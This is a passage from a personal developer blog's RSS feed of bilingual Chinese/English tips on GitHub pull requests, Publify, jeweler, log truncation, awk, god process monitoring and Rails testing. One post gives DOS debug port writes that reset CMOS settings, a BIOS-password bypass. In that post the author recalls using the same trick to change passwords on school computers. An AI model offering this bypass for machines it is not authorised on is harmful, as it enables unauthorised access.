&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSJEMjAxNC8wMS8yNC8wOV8xMF8zNV8zNDNfU2NyZWVuc2hvdF9mcm9tXzIwMTRfMDFfMjRfMDZfNTlfMjgucG5nBjoGRVQ/Screenshot%20from%202014-01-24%2006png:28.:ext" title="Screenshot From 2014 01 24 06:59:28" alt="Screenshot From 2014 01 24 06:59:28" rel="225x255" width="1366" height="768" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSI0MjAxNC8wMS8yNC8wOV8xMF8zNV8xNl9uZXdseV9mb3JrZWRfcHJvamVjdC5wbmcGOgZFVA/newly_forked_project.png" title="Newly Forked Project" alt="Newly Forked Project" rel="225x255" width="1366" height="768" /&gt;&lt;/p&gt;
&lt;p&gt;2. clone it:&lt;/p&gt;
&lt;pre&gt;siwei@siwei-Lenovo-V470c:/workspace$ git clone https://github.com/sg552/publify.git
Cloning into 'publify'...
remote: Reusing existing pack: 54092, done.
remote: Counting objects: 2, done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 54094 (delta 1), reused 0 (delta 0)
Receiving objects: 100% (54094/54094), 22.76 MiB | 1.01 MiB/s, done.
Resolving deltas: 100% (35321/35321), done.
&lt;/pre&gt;
&lt;p&gt;3. edit, commit, push...&amp;#160;&lt;/p&gt;
&lt;p&gt;4. send pull request ( from the origin git repo)&lt;/p&gt;
&lt;p&gt;4.1 find the button here:&amp;#160;&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSI6MjAxNC8wMS8yOS8wNl8xN180NV83NDNfY3JlYXRlX3B1bGxfcmVxdWVzdF9zdGVwMS5wbmcGOgZFVA/create_pull_request_step1.png" title="Create Pull Request Step1" alt="Create Pull Request Step1" rel="225x255" width="1366" height="768" /&gt;&lt;/p&gt;
&lt;p&gt;4.2 submit this form:&amp;#160;&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSJEMjAxNC8wMS8yOS8wNl8xN180NV85OTlfY3JlYXRlX3B1bGxfcmVxdWVzdF9zdGVwMl9maWxsX2Zvcm0ucG5nBjoGRVQ/create_pull_request_step2_fill_form.png" title="Create Pull Request Step2 Fill Form" alt="Create Pull Request Step2 Fill Form" rel="225x255" width="1366" height="768" /&gt;&lt;/p&gt;
&lt;p&gt;5. wait your commits to be merged. &amp;#160; &amp;#160;&lt;/p&gt;
&lt;p&gt;origin page : &lt;a href="https://github.com/fdv/publify/pull/351" target="_blank"&gt;https://github.com/fdv/publify/pull/351&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSJEMjAxNC8wMS8yOS8wNl8xNF8zM18zMjhfU2NyZWVuc2hvdF9mcm9tXzIwMTRfMDFfMjlfMDZfMDdfMzIucG5nBjoGRVQ/Screenshot%20from%202014-01-29%2006png:32.:ext" title="Screenshot From 2014 01 29 06:07:32" alt="Screenshot From 2014 01 29 06:07:32" rel="225x255" width="1366" height="768" /&gt;&lt;/p&gt;</description>
      <pubDate>Thu, 23 Jan 2014 22:25:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/how-to-contribute-to-opensource-projects</link>
    </item>
    <item>
      <title>publify的安装过程(setup publify as your blog system)</title>
      <description>&lt;p&gt;真的是非常简单，不过比官方多了两步。(it's really simple however you need to run the database related tasks manually yourself.&lt;/p&gt;
&lt;p&gt;1. $ git clone https://github.com/fdv/publify.git&lt;/p&gt;
&lt;p&gt;2. $ cp config/database.yml.mysql config/database.yml&lt;/p&gt;
&lt;p&gt;3. $ bundle install &lt;/p&gt;
&lt;p&gt;4. $ bundle exec rake db:create &lt;/p&gt;
&lt;p&gt;5. $ bundle exec rake db:migrate&lt;/p&gt;
&lt;p&gt;6. $ bundle exec rake db:seed&lt;br /&gt; &lt;/p&gt;
&lt;p&gt;安装结束后，设置好用户名和密码就可以开始了～  &lt;a href="http://yuqiong.me" target="_blank"&gt;&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;&lt;a href="http://yuqiong.me" target="_blank"&gt;张誉琼的个人网站&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Wed, 22 Jan 2014 23:10:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/setup-publify-as-your-blog-system</link>
    </item>
    <item>
      <title>jeweler上手初体验（create your rubygem using jeweler) </title>
      <description>&lt;p&gt;传统的gem的建立方式很繁琐， 需要手动控制版本啊，依赖啊。(the problems that creating a rubygem using the official way are: &amp;#160;not very easy to control the version(minor, major, path), and dependencies. &amp;#160;so we use jeweler)&lt;/p&gt;
&lt;p&gt;steps:&lt;/p&gt;
&lt;p&gt;1. $ gem install jeweler&lt;/p&gt;
&lt;p&gt;2. $ rbenv rehash&lt;/p&gt;
&lt;p&gt;3. $ jeweler auditable_controller&lt;/p&gt;
&lt;p&gt;4. 发现jeweler 都帮你用git 做了提交了( jeweler helps you commited the code) &lt;/p&gt;
&lt;pre&gt;	create	.gitignore
	create	Rakefile
	create	Gemfile
	create	LICENSE.txt
	create	README.rdoc
	create	.document
	create	lib
	create	lib/auditable_controller.rb
	create	test
	create	test/helper.rb
	create	test/test_auditable_controller.rb
       Jeweler has prepared your gem in ./auditable_controller
&lt;/pre&gt;
&lt;p&gt;5. 修改Gem, 使用 gem "simplecov" &amp;#160;(use simplecov instead of rcov in Gemfile)&amp;#160;&lt;/p&gt;
&lt;pre&gt;# Gemfile
group :development do
  gem "shoulda", "&amp;gt;= 0"
  gem "rdoc", "~&amp;gt; 3.12"
  gem "bundler", "~&amp;gt; 1.0"
  gem "jeweler", "~&amp;gt; 2.0.0"
  gem "simplecov"   # don't use gem 'rcov' if you are using Ruby 1.9
end
&lt;/pre&gt;
&lt;p&gt;6. bundle install&amp;#160;&lt;/p&gt;
&lt;p&gt;7. 修改RakeFile&amp;#160; (remove the rcov code segment from Rakefile) &lt;/p&gt;
&lt;pre&gt; 35 #require 'rcov/rcovtask'
 36 #Rcov::RcovTask.new do |test|
 37 #  test.libs &amp;lt;&amp;lt; 'test'
 38 #  test.pattern = 'test/**/test_*.rb'
 39 #  test.verbose = true
 40 #  test.rcov_opts &amp;lt;&amp;lt; '--exclude "gems/*"'
 41 #end

&lt;/pre&gt;
&lt;p&gt;8. create your gem's version:&amp;#160;&lt;/p&gt;
&lt;pre&gt;$ rake version:write MAJOR=1 MINOR=0 PATCH=1
Updated version: 1.0.1
&lt;/pre&gt;</description>
      <pubDate>Wed, 22 Jan 2014 07:11:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/create-your-rubygem-using-jeweler</link>
    </item>
    <item>
      <title>几个比较好用的在线绘图网站（several good diagram&amp;mockup online tools)</title>
      <description>&lt;p&gt;关键是： 上手简单， 可以随时保存成 pdf, jpg等。 &amp;#160;(the key is: easy to use and save as jpg/xml/pdf)&amp;#160;&lt;/p&gt;
&lt;p&gt;1. &lt;a href="gliffy.com" target="_blank"&gt;gliffy.com&lt;/a&gt;&amp;#160; 有非常丰富的图片库。（关键要用左下角的'more shapes'，然后选择各种你想要的） &amp;#160;( pay attention to the 'more shapes' in the left bottom corner of the page)&amp;#160;&lt;/p&gt;
&lt;p&gt;2. &lt;a href="https://moqups.com/" target="_blank"&gt;https://moqups.com/&lt;/a&gt;&amp;#160; 很专业的mockup 图 &amp;#160;(very professional mockups)&amp;#160;&lt;/p&gt;</description>
      <pubDate>Wed, 22 Jan 2014 02:00:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/good-diagram-mockup-online-tools</link>
    </item>
    <item>
      <title>如何处理服务器上的大日志文件(how to deal with huge log file in production environment?)</title>
      <description>&lt;p&gt;答案：使用 echo. 不要使用 rm &amp;#160;(short answer: &amp;#160;use 'echo' but not 'rm' )&lt;/p&gt;
&lt;p&gt;$ echo '' &amp;gt; huge_file.log &amp;#160;&lt;/p&gt;
&lt;p&gt;原因： &amp;#160;运行中的系统，会有一个process一直在写入这个日志文件。如果简单的删掉的话，磁盘空间不会释放。除非把这个process也干掉。 而使用echo 的话，会把这个文件的内容清空，非常安全有效。 可以做到空间的实时释放（每秒大约1G） &amp;#160; ( explaination: &amp;#160;the huge log file is always written by some PROCESS. The disk space is not freed if we simplely remove this huge file until the PROCESS is terminated. However, the echo command will clear the file's content and free the disk space in real-time. (about 1G/s ) )&lt;/p&gt;
&lt;p&gt;refer to : &lt;a target="_blank" href="http://stackoverflow.com/questions/332629/rm-not-freeing-diskspace"&gt;http://stackoverflow.com/questions/332629/rm-not-freeing-diskspace&lt;/a&gt;&amp;#160; &amp;#160;and thanks to : &amp;#160;jiejie, our Operation Master!&amp;#160;&lt;/p&gt;</description>
      <pubDate>Wed, 22 Jan 2014 01:24:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/how-to-deal-with-huge-log-file-in-production</link>
    </item>
    <item>
      <title>找出 某些command 的PID  (using awk find all the pids ) </title>
      <description>
&lt;p&gt;今天，沛沛交给我一招： awk. 找出所有的pid 列表。   ps -ef|grep fetcher |awk '{print $2}' &amp;#160;&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;pre&gt;$ ps -ef | grep fetcher
root     22980 22967  5 17:41 ?        00:01:45 /root/.rbenv/versions/1.9.3-p327/bin/ruby /root/.rbenv/versions/1.9.3-p327/bin/god stop fetcher
root     23041     1  0 17:41 ?        00:00:00 sh -c god stop fetcher &amp;amp;&amp;amp; god start fetcher
root     23046 23041  0 17:41 ?        00:00:15 /root/.rbenv/versions/1.9.3-p327/bin/ruby /root/.rbenv/versions/1.9.3-p327/bin/god stop fetcher
root     23070     1  0 17:41 ?        00:00:00 sh -c god stop fetcher &amp;amp;&amp;amp; god start fetcher
root     23072 23070  0 17:41 ?        00:00:16 /root/.rbenv/versions/1.9.3-p327/bin/ruby /root/.rbenv/versions/1.9.3-p327/bin/god stop fetcher
root     23143     1  0 17:41 ?        00:00:00 sh -c god stop fetcher &amp;amp;&amp;amp; god start fetcher
root     23152 23143  0 17:41 ?        00:00:15 /root/.rbenv/versions/1.9.3-p327/bin/ruby /root/.rbenv/versions/1.9.3-p327/bin/god stop fetcher
root     23173     1  0 17:41 ?        00:00:00 sh -c god stop fetcher &amp;amp;&amp;amp; god start fetcher
root     23190 23173  0 17:41 ?        00:00:16 /root/.rbenv/versions/1.9.3-p327/bin/ruby /root/.rbenv/versions/1.9.3-p327/bin/god stop fetcher
root     23245     1  0 17:41 ?        00:00:00 sh -c god stop fetcher &amp;amp;&amp;amp; god start fetcher
root     23256 23245  0 17:41 ?        00:00:16 /root/.rbenv/versions/1.9.3-p327/bin/ruby /root/.rbenv/versions/1.9.3-p327/bin/god stop fetcher

&lt;/pre&gt;
&lt;p&gt;使用了awk后：&lt;/p&gt;
&lt;pre&gt;$ ps -ef|grep fetcher |awk '{print $2}'  
23941
23942
23946
23951
23969
24000
24005
24009
24011
24023
24028
24043
24046
24089
24104
24121

&lt;/pre&gt;

</description>
      <pubDate>Tue, 21 Jan 2014 10:19:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/using-awk-find-all-pids-only</link>
    </item>
    <item>
      <title>如何成为weixin开放平台的开发者（how to become a developer on weixin open-platform)</title>
      <description>&lt;p&gt;1。几个概念： &amp;#160;&lt;/p&gt;
&lt;p&gt;微信公众平台（ &lt;a href="https://mp.weixin.qq.com/" target="_blank"&gt;https://mp.weixin.qq.com/&lt;/a&gt;) &amp;#160;我们用的是这个。 在它上面申请服务号，订阅号等。 它提供了很多方便的接口。 也有一个简单的操作后台。&lt;/p&gt;
&lt;p&gt;微信开发者平台 (&lt;a href="http://open.weixin.qq.com/" target="_blank"&gt;http://open.weixin.qq.com/&lt;/a&gt;) 例如：  Android上手指南
手把手教你在Android上创建一个与微信通信的APP &lt;/p&gt;
&lt;p&gt;2. 我们暂时申请个 订阅号吧（个人用户）。 &amp;#160;看看这东西是干嘛的。 注册过程略. 时间大约半天。&lt;/p&gt;
&lt;p&gt;3. 最后，我们要成为开发者， 需要你上传一个头像，并且指定自己的活动区域。 过程略。&lt;/p&gt;

</description>
      <pubDate>Tue, 21 Jan 2014 08:48:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/how-to-become-a-weixin-mp-developer</link>
    </item>
    <item>
      <title>command not found error( UBUNTU下很奇怪的错误）</title>
      <description>&lt;p&gt;今天发现服务器上出现了这个错误。 (today I met this error on my personal server)&amp;#160;&lt;/p&gt;
&lt;p&gt;GOOGLE一下，没搞定（参考 &lt;a href="http://www.thattommyhall.com/2012/12/12/sorry-command-not-found-has-crashed/" target="_blank"&gt;http://www.thattommyhall.com/2012/12/12/sorry-command-not-found-has-crashed/&lt;/a&gt; ) &amp;#160;(this post doesn't help me)&amp;#160;&lt;/p&gt;

&lt;p&gt; 后来看到这个帖子 (&lt;a href="http://blog.csdn.net/miyuehu/article/details/12039347" target="_blank"&gt;http://blog.csdn.net/miyuehu/article/details/12039347&lt;/a&gt;)受到了启发，觉得需要从 没找到的命令 入手，所以发现是rbenv, gem, bundle都失效了。 于是查看 $PATH,  发现 $PATH 设置的不对，里面包含了一段错误的PATH。 改掉之后就好了。 ( I got some clues from the link of this paragraph, and found that my rbenv and its related command are broken. &amp;#160;and further more, my $PATH variable is broken . so I fixed this problem by correcting the $PATH in my ~/.bashrc file)&amp;#160;&lt;/p&gt;

&lt;pre&gt;root@li539-250:/opt# echo $PATH  # there's no /opt/mongodb... folder. 
/root/.rbenv/shims:/root/.rbenv/bin:/opt/mongodb-linux-i686-2.4.5/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

after correction:
$ echo $PATH
/root/.rbenv/shims:/root/.rbenv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

&lt;/pre&gt;
</description>
      <pubDate>Mon, 20 Jan 2014 12:28:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/command-not-found-error</link>
    </item>
    <item>
      <title>windows下如何重置bios (how to reset bios under windows)</title>
      <description>&lt;p&gt;太不容易了。今天折腾了我一个早上。 (this morning I fixed this problem by using the 'debug' command under DOS. )&lt;/p&gt;
&lt;p&gt;我的笔记本从来都是 无法进入BIOS， 只能每次都是进入一个莫名其妙的windows loader 还是什么东东。我把硬盘拆了都不管用。(my laptop is not able to enter the bios and install ubuntu because of a strange windows load manager or so. It could not be removed even if the harddisk is removed. )&lt;/p&gt;
&lt;p&gt;查了一早上。发现时 现在的主板，一般使用UEFI/EFI 来取代原来的 BIOS。 我郁闷。无法搞定啊。 (after google around for 2 hours , not solution found)&amp;#160;&lt;/p&gt;
&lt;p&gt;把CMOS电池拆了也没用。&amp;#160;&lt;/p&gt;
&lt;p&gt;后来找到个光盘，进入了WIN PE， (at last, I found a windows boot CD and enter the win PE , which supports DOS command)&amp;#160;&lt;/p&gt;
&lt;p&gt;因为刚才搜索的时候，看到有帖子说 debug -o 的那个命令可以给CMOS 放电。（也想起了自己高中时候，在电脑课上用同样的方法给学校的机房换密码，改背景桌面，匿名留言说自己是黑客，全年级的同学都看到了哈哈） 于是试了一下，太爽了啊。&lt;/p&gt;
&lt;p&gt;步骤： ( so I tried this command and successfully enter my bios :)&amp;#160;&lt;/p&gt;
&lt;pre&gt;$ debug
-o 70 16
-o 71 16
-q 
&lt;/pre&gt;
&lt;p&gt;爽歪歪了有木有！ &amp;#160;(oh yeah! )&lt;/p&gt;</description>
      <pubDate>Sun, 19 Jan 2014 03:01:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/how-to-reset-bios-under-windows</link>
    </item>
    <item>
      <title>RAILS中如何测试 private method. ( how to test private methods in Rails. )</title>
      <description>&lt;p&gt;
modify your spec_helper.rb and add the code below: 
&lt;/p&gt;
&lt;pre&gt;#  for testing the private method.
#  EXAMPLE:
#  describe_private User do
#    describe "about the role-permission" do
#      it "should ..." do
#        true.should == true
#      end
#    end
#  end
#  p.s. for another approach, please use: myobject.send(:method_name, args)
#  see:
#  http://stackoverflow.com/questions/267237/whats-the-best-way-to-unit-test-protected-private-met
def describe_private *args, &amp;amp;block
  example = describe *args, &amp;amp;block
  clazz = args[0]
  if clazz.is_a? Class
    saved_private_instance_methods = clazz.private_instance_methods
    example.before do
      clazz.class_eval { public *saved_private_instance_methods }
    end 
    example.after do
      clazz.class_eval { private *saved_private_instance_methods }
    end 
  end 
end
&lt;/pre&gt;
&lt;p&gt;refer to: &lt;a href="http://sg552.iteye.com/blog/758130" target="_blank"&gt;http://sg552.iteye.com/blog/758130&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Sat, 18 Jan 2014 02:46:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/test-private-method-in-rails</link>
    </item>
    <item>
      <title>kill 与 cat一起使用，干掉某个进程 (kill a process by its pid file) </title>
      <description>&lt;p&gt;refer to : &lt;a href="http://mindspill.net/computing/linux-notes/kill-a-process-from-pid-file/" target="_blank"&gt;http://mindspill.net/computing/linux-notes/kill-a-process-from-pid-file/&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;kill -9 $(cat tmp/pids/mongrel.pid)&lt;/p&gt;</description>
      <pubDate>Tue, 14 Jan 2014 01:19:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/kill-process-by-pid-file</link>
    </item>
    <item>
      <title>god进阶： 配置文件( god advanced: config file) </title>
      <description>参考（refer to )&lt;a href="http://godrb.com/" target="_blank"&gt;http://godrb.com/&lt;/a&gt;
&lt;p&gt; 每一个watch都代表一个process.    如果你有多个watch(process), 需要为每个process 分别指定pid_file. (If the process you're watching runs as a daemon (as mine does), you'll need to set the pid_file attribute.) &lt;/p&gt;
&lt;p&gt; 如果没有提供restart ， 那么god会很聪明的先stop, 再执行start  (god is smart enought to 'restart' by calling 'stop', 'start' if 'restart' command is not provided. ) &lt;/p&gt;

&lt;p&gt; 可以以daemon 形式启动的process: (config files for those process that could be start as daemon ) &lt;/p&gt;
&lt;pre&gt;# 注意： 对于可以以 daemon 形式执行的命令，用这个格式（注意其中的 restart, pid_file )   
God.watch do |w|
  w.name = "gravatar2-mongrel-#{port}"

  w.start = "mongrel_rails start -c #{RAILS_ROOT} -p #{port} \
    -P #{RAILS_ROOT}/log/mongrel.#{port}.pid  -d"
  w.stop = "mongrel_rails stop -P #{RAILS_ROOT}/log/mongrel.#{port}.pid"
  w.restart = "mongrel_rails restart -P #{RAILS_ROOT}/log/mongrel.#{port}.pid"

  w.pid_file = File.join(RAILS_ROOT, "log/mongrel.#{port}.pid")

  # 这个是内置的命令，在启动之前，清理残存的PID文件 
  w.behavior(:clean_pid_file)  
  ...
end

&lt;/pre&gt;

&lt;p&gt;注意：对于 无法以 daemon  形式执行的process（只能以 nohup .. .&amp;amp; 的形式启动）， 要用这样的配置文件： ( we should use this config file if the process could not be run as daemon except using "nohup...&amp;amp;") &lt;/p&gt;
&lt;pre&gt;# 注意： 不要有 stop, pid_file 以及 behavior 这三个东东。   
# (NOTICE: don't use stop, pid_file and behavior ) 
RAILS_ROOT = '/sg552/workspace/m-video-fetcher'
PID_FILE = RAILS_ROOT + '/tmp/pids/fetcher.pid'
COMMAND = "cd #{RAILS_ROOT} &amp;amp;&amp;amp; ruby script/start_fetch.rb"
puts COMMAND
God.watch do |w| 
  w.name = 'fetcher'
  w.dir = RAILS_ROOT
  w.start = "ruby script/start_fetch.rb"
#  w.stop = "kill -9 $(cat #{PID_FILE})"
#  w.pid_file = PID_FILE
#  w.behavior :clean_pid_file
  w.log = "#{RAILS_ROOT}/fetcher.log"
  w.keepalive
end

&lt;/pre&gt;</description>
      <pubDate>Tue, 14 Jan 2014 00:20:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/god-advanced-config-file</link>
    </item>
    <item>
      <title>god 初体验 ( my first experience of god) </title>
      <description>&lt;p&gt;最近的一个项目需要用WEB 来控制 后台运行的进程。 搜索未果，于是在stackoverflow上发了个帖子(&lt;a href="http://stackoverflow.com/questions/21069839/whats-the-best-practice-to-control-linux-process-from-web-page-rails" target="_blank"&gt;http://stackoverflow.com/questions/21069839/whats-the-best-practice-to-control-linux-process-from-web-page-rails&lt;/a&gt;)。 &amp;#160; 同时看到有人推荐&lt;a href="godrb.com" target="_blank"&gt;godrb.com&lt;/a&gt; ，所以试了一下。&lt;/p&gt;
&lt;p&gt;据说这个组建可以很好的控制进程的运行，加上各种监控。所以我试了试:&amp;#160;&lt;/p&gt;
&lt;pre&gt;# /sg552/workspace/test_god/test.rb'
  2 loop do
  3   puts 'hi'
  4   sleep 2
  5 end

# god script
God.watch do |w| 
  w.name = 'hi'
  w.start = 'ruby /sg552/workspace/test_god/test.rb'
  w.keepalive
end

# ouput on ubuntu
sg552@youku:/sg552/workspace/test_god$ god -c hi.god -D
I [2014-01-13 18:12:22]  INFO: Loading hi.god
I [2014-01-13 18:12:22]  INFO: Syslog enabled.
I [2014-01-13 18:12:22]  INFO: Using pid file directory: /home/sg552/.god/pids
I [2014-01-13 18:12:22]  INFO: Socket already in use
I [2014-01-13 18:12:22]  INFO: Socket is stale, reopening
I [2014-01-13 18:12:22]  INFO: Started on drbunix:///tmp/god.17165.sock
I [2014-01-13 18:12:22]  INFO: hi move 'unmonitored' to 'up'
I [2014-01-13 18:12:22]  INFO: hi moved 'unmonitored' to 'up'
I [2014-01-13 18:12:22]  INFO: hi [trigger] process is not running (ProcessRunning)
I [2014-01-13 18:12:22]  INFO: hi move 'up' to 'start'
I [2014-01-13 18:12:22]  INFO: hi start: ruby /sg552/workspace/test_god/test.rb
I [2014-01-13 18:12:22]  INFO: hi moved 'up' to 'up'

&lt;/pre&gt;
&lt;p&gt;god 的NB之处，在于它可以每5秒钟就检测一下对应的进程。 例如，我们看一下目前的进程情况: &amp;#160;&lt;/p&gt;
&lt;pre&gt;# notice the pid of: 1875,   
sg552@youku:/sg552/workspace/test_god$ ps -ef | grep god
sg552     1702 23782  0 18:20 pts/1    00:00:00 /home/sg552/.rbenv/versions/1.9.3-p327/bin/ruby /home/sg552/.rbenv/versions/1.9.3-p327/bin/god -c hi.god -D
sg552     1875     1  0 18:23 ?        00:00:00 ruby /sg552/workspace/test_god/test.rb
sg552     1885  1763  0 18:24 pts/2    00:00:00 grep --color=auto god
&lt;/pre&gt;
&lt;p&gt;1875 就是god帮我们启动的test.rb 进程，  我们把它干掉试试。。。&amp;#160;&lt;/p&gt;
&lt;pre&gt;$ kill -9 1875 
# 这个时候， god的输出页面，就会这样， 很神奇吧？：
I [2014-01-13 18:24:13]  INFO: hi [trigger] process is not running (ProcessRunning)
I [2014-01-13 18:24:13]  INFO: hi move 'up' to 'start'
I [2014-01-13 18:24:13]  INFO: hi start: ruby /sg552/workspace/test_god/test.rb
I [2014-01-13 18:24:13]  INFO: hi moved 'up' to 'up'

# 可以看到，它又被启动起来了。
sg552@youku:/sg552/workspace/test_god$ ps -ef | grep test.rb
sg552     1376 23997  0 18:09 pts/4    00:00:00 vim test.rb
sg552     1889     1  0 18:24 ?        00:00:00 ruby /sg552/workspace/test_god/test.rb
sg552     1901  1763  0 18:27 pts/2    00:00:00 grep --color=auto test.rb
&lt;/pre&gt;

&lt;p&gt; 看看GOD是如何控制CPU和内存的使用量的：&lt;/p&gt;
&lt;pre&gt;# 这个脚本比较猛： test.rb
  1 data = ''
  2 loop do
  3   puts 'hi'
  4   100000.times { data &amp;lt;&amp;lt; 'x'}
  5 end

# hi.god
God.watch do |w| 
  w.name = 'hi'
  w.start = 'ruby /sg552/workspace/test_god/test.rb'
  w.keepalive(:memory_max =&amp;gt; 150.megabytes, :cpu_max =&amp;gt; 50.percent )
end

# 重启GOD， 之后，发现CPU越来越高的时候， GOD就会重启这个进程。 
I [2014-01-13 18:48:33]  INFO: hi [trigger] cpu out of bounds [9.345794392462356%%, *84.27876823360998%%, *91.39307897056767%%, *94.0134392181086%%] (CpuUsage)
I [2014-01-13 18:48:33]  INFO: hi move 'up' to 'restart'
I [2014-01-13 18:48:33]  INFO: hi stop: default lambda killer
I [2014-01-13 18:48:33]  INFO: hi sent SIGTERM
I [2014-01-13 18:48:33]  INFO: hi process stopped
I [2014-01-13 18:48:33]  INFO: hi start: ruby /sg552/workspace/test_god/test.rb
I [2014-01-13 18:48:33]  INFO: hi moved 'up' to 'up'

# 干掉这个进程：
$ god stop hi

&lt;/pre&gt;
&lt;p&gt;一些其他的常见问题：&lt;/p&gt;
&lt;p&gt;$ god stop hi &amp;#160;# 停止 hi 这个任务（进程）&lt;/p&gt;
&lt;p&gt;$ god quit # 彻底停止god&lt;/p&gt;
&lt;p&gt;$ god status # 查看god的状态&lt;/p&gt;

</description>
      <pubDate>Mon, 13 Jan 2014 10:15:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/first-experience-of-god</link>
    </item>
    <item>
      <title>我的一点提高英语水平的经验( how to improve your English? )</title>
      <description>&lt;p&gt;今天有个帖子，很有趣。我看到有位朋友在一个JD的留言中，说自己英语不好， (&lt;a href="http://ruby-china.org/topics/16318"&gt;http://ruby-china.org/topics/16318&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;我替他觉得很可惜。&lt;/p&gt;
&lt;p&gt;他似乎比较羡慕我在MOTO的工作经历， 认为这对我的英文有好处。实际上，我的英文一直都不好（高考分不低，不过大学四年没背过单词。唉）。只是可以勉强跟人交流软件开发。&lt;/p&gt;
&lt;p&gt;要我总结的话，我想说三句：&lt;/p&gt;
&lt;p&gt;1. MOTO的三年对我的英文基本没提高。因为身边都是中国人。&lt;/p&gt;
&lt;p&gt;2. 过去5年，我从来都坚持看英文官方文档( 也翻译过 velocity, &lt;a href="http://siwei.me:82/docs_for_checkstyle.html"&gt;checkstyle的文档&lt;/a&gt;）。有了问题也第一时间搜索英文答案。在stackoverflow上用英文回答问题（嘿嘿还没见过分数比我高的 。我的stackoverflow 个人档案在 siwei.me的首页可以看到 &amp;#160;）. &amp;#160;&lt;/p&gt;
&lt;p&gt;然后，让自己英文提高最快的是：2年前读了两本英文原版书： &amp;#160;&amp;lt;&amp;lt; meta programming ruby&amp;gt;&amp;gt; 和 &amp;lt;&amp;lt;coffeescript &amp;gt;&amp;gt; . &amp;#160;第一本用了2个月，第二本用了3个星期。读完之后英语阅读基本无压力。&lt;/p&gt;
&lt;p&gt;口语一直很烂，跟美国友人一起吃饭的话，没法为他们介绍各种食物的来历，各种中国民间习俗。 稍微及格的是可以基本无障碍的交流软件开发。&lt;/p&gt;
&lt;p&gt;3. 英语不好不要着急，只要你抱有一颗学习的心，每天看上2，3页原版，把里面的每个生词都标注出来，一个一个的标音标，写注释，在周末 写写生词， 温习下大学英语， &amp;#160; 我相信读完几本书之后你就完全可以去美国 H1B 工作了。&lt;/p&gt;
&lt;p&gt;《重构》的作者熊节一直是我的榜样。他当初也是一个小吊丝，人生的起步比我们还困难，但是他能够辛辛苦苦的每天努力，05年翻译完《重构》， 然后06年左右翻译《人件》 ，《WITHOUT EJB》 等很多经典书籍，一点一点的成长，现在是thoughtworks 成都分公司的负责人。觉得学习困难的时候，想想他当初的艰难。&lt;/p&gt;
&lt;p&gt;最后上一张照片，希望对这位朋友 @mvj3 &amp;#160; 有帮助：&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSI0MjAxNC8wMS8xMi8xMl8wMF81NV8zNTJfSU1HXzIwMTQwMTEyXzE5NDYyMS5qcGcGOgZFVA/IMG_20140112_194621.jpg" title="Img 20140112 194621" alt="Img 20140112 194621" rel="225x255" width="900" height="1602" /&gt;&lt;/p&gt;</description>
      <pubDate>Sun, 12 Jan 2014 11:39:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/how-to-improve-your-english</link>
    </item>
    <item>
      <title>obtrusive js v.s. unobtrusive js</title>
      <description>&lt;p&gt;obtrusive js:&lt;/span&gt;
&lt;/p&gt;&lt;p&gt;&amp;lt;div onclick='alert("hihihi"); a = 1+1; c = 2*2; ' &amp;gt; some text here &amp;lt;/div&amp;gt;&lt;br /&gt;1. 难于查看（特别是多行代码） &amp;#160; &amp;#160;( hard to view the code)&lt;br /&gt;2. 难于单元测试 &amp;#160; ( hard to write unit test)&lt;br /&gt;3. JS 跟ＨＴＭＬ 混在了一起。 ( mixed js with html... )&lt;/p&gt;
&lt;p&gt;unobtrusive js: （含蓄ＪＳ）&lt;/p&gt;
&lt;p&gt;&amp;lt;div class='alert_hi'&amp;gt;&lt;/span&gt;some text here&amp;lt;/div&amp;gt;&lt;br /&gt;&amp;lt;div class='alert_hi'&amp;gt; anotherr text ehrre.... &amp;lt;/div&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;script&amp;gt;&lt;br /&gt;$('.alert_hi').onclick = function (){ alert('hihihi') }&lt;/span&gt;
&lt;br /&gt;&amp;lt;/script&amp;gt;&lt;/p&gt;
&lt;p&gt;1. 解耦： ＪＳ 代码与ＨＴＭＬ代码 &amp;#160;(decoupled js and html)&lt;/span&gt;
&lt;br /&gt;2. 方便单元测试。 (比如上面，直接对ＦＯＯ进行测试 ） &amp;#160;(easy to test)&lt;br /&gt;3. 提高代码复用程度。 &amp;#160;(easy to reuse)&lt;br /&gt;4. 高手都这么用。 ( js gurus way)&amp;#160;&lt;br /&gt;&lt;/p&gt;</description>
      <pubDate>Fri, 10 Jan 2014 02:40:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/obtrusive-js-vs-unobtrusive-js</link>
    </item>
    <item>
      <title>rails activerecord 中的 insert  ( why array.insert works in Ruby but not in Rails?)</title>
      <description>&lt;p&gt;因为 Rails 中返回的是 ActiveRecord.relationship, &amp;#160;而不是raw Array.&lt;/p&gt;
&lt;pre&gt;e.g.
# in irb
